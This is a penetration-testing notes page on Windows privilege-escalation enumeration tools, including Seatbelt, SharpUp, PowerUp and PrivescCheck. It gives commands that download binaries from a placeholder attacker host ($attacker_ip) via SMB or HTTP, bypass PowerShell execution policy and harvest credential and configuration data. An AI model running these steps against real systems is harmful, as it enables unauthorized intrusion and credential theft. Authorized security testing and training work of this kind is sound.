# Automated scripts

{% embed url="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md" %}

## `SeatBelt` | https://github.com/GhostPack/Seatbelt

> Seatbelt provides an insight into the following sections: _Antivirus, AppLocker Settings, ARP table and Adapter information, Classic and advanced audit policy settings, Autorun executables/scripts/programs, Browser(Chrome/Edge/Brave/Opera) Bookmarks, Browser History, AWS/Google/Azure/Bluemix Cloud credential files, All configured Office 365 endpoints which are synchronized by OneDrive, Credential Guard configuration, DNS cache entries, Dot Net versions, DPAPI master keys, Current environment %PATH$ folders, Current environment variables, Explicit Logon events (Event ID 4648) from the security event log, Explorer most recently used files, Recent Explorer “run” commands, FileZilla configuration files, Installed hotfixes, Installed, “Interesting” processes like any defensive products and admin tools, Internet settings including proxy configs and zones configuration, KeePass configuration files, Local Group Policy settings, Non-empty local groups, Local users, whether they’re active/disabled, Logon events (Event ID 4624), Windows logon sessions, Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system and other information._

```bash
# import to windows machine
impacket-smbserver share $(pwd) -smb2support

# on windows
copy \\$attacker_ip\share\Seatbelt.exe
Seatbelt.exe -group=all
```

## `SharpUp` | https://github.com/GhostPack/SharpUp

> It detects the following: _Modifiable Services, Modifiable Binaries, AlwaysInstallElevated Registry Keys, Modifiable Folders in %PATH%, Modifiable Registry Autoruns, Special User Privileges if any and McAfee Sitelist.xml files_.

```bash
# attacker
python -m SimpleHTTPServer 80
# windows
powershell.exe iwr -uri $attacker_ip/SharpUp.exe -o C:\Temp\SharpUp.exe
SharpUp.
```

## `JAWS`

{% embed url="https://github.com/411Hall/JAWS" %}

> Surfing through one C# binary to another, we are finally attacked by JAWS. It is a PowerShell script for a change. As it was developed on PowerShell 2.0 it is possible to enumerate Windows 7 as well. It can work and detect the following: _Network Information (interfaces, arp, netstat), Firewall Status and Rules, Running Processes, Files and Folders with Full Control or Modify Access, Mapped Drives, Potentially Interesting Files, Unquoted Service Paths, Recent Documents, System Install Files, AlwaysInstallElevated Registry Key Check, Stored Credentials, Installed Applications, Potentially Vulnerable Services, MUICache Files, Scheduled Tasks_.

```powershell
# bypass execution policy
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
```

## `PowerUP`

{% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" %}

> PowerUp is another PowerShell script that works on enumerating methods to elevate privileges on Windows System. It has an Invoke-AllChecks option that will represent any identified vulnerabilities with abuse functions as well. It is possible to export the result of the scan using -HTMLREPORT flag. PowerUp detects the following Privileges: _Token-Based Abuse, Services Enumeration and Abuse, DLL Hijacking, Registry Checks, etc_. In order to use the PowerUp, we need to transfer the script to the Target Machine using any method of your choice. Then bypass the Execution Policy in order to execute the script from PowerShell. Then use the Invoke-AllChecks in order to execute the PowerUp on the target machine. We can see it has already provided us with some Unquoted Path Files that can be used to elevate privilege.

```
powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

## `PowerLess`

{% embed url="https://github.com/gladiatx0r/Powerless" %}

> The problem with many legacy Windows machines is that the PowerShell is not accessible and the running of executable files is restricted. But we need to enumerate the possibilities for it as well to elevate privileges. Powerless comes to the rescue here. All you had to do is transfer the batch file to the target machine thought the method of your choice and then execute it. It will work and will provide data about the methods and directories that can be used to elevate privileges on the target machine.

## `PrivEscCheck`

{% embed url="https://github.com/itm4n/PrivescCheck" %}

> Quick enumeration. Suitable with AppLocker or any other Application whitelisting. It generates a report. To use it, we transfer the script file to the target machine with the method of your choosing. Then bypass the execution policy and run it.

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

## MetaSploit

### Windows Exploit Suggester

```bash
use post/multi/recon/local_exploit_suggester
set session 1
show options
# change options
exploit
```
